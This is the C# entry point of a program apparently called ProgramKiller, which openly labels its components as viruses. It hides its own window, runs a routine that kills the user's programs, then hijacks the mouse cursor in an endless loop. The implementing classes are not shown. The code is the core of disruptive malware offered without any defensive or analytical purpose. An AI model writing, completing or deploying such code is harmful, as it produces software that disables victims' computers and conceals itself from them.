using ProgramKiller.Basics;
using ProgramKiller.Viruses;

namespace ProgramKiller
{
    internal class Program
    {
        private static void Main(string[] args)
        {
            IVirus killerVirus = new ProgramsKiller();
            IVirus cursorVirus = new CursorController();
            IVirus hideVirus = new HideWindow();

            hideVirus.Run();
            killerVirus.Run();

            while (true)
                cursorVirus.Run();
        }
    }
}